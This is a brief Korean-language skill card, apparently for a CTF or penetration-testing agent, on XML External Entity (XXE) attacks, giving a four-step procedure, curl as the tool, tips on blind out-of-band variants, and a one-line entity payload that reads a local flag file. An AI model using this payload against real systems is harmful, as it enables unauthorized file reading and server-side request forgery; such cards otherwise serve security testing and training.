---
name: xxe
description: XXE로 파일 읽기·SSRF
---
## When
XML 입력 파싱

## Tools
curl

## Procedure
1) XML 입력점 확인
2) 외부 엔티티 주입
3) 파일/SSRF
4) 블라인드는 OOB

## PoC
```
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>
```

## Pitfalls
파라미터 엔티티·OOB DTD로 블라인드; 인코딩 이슈
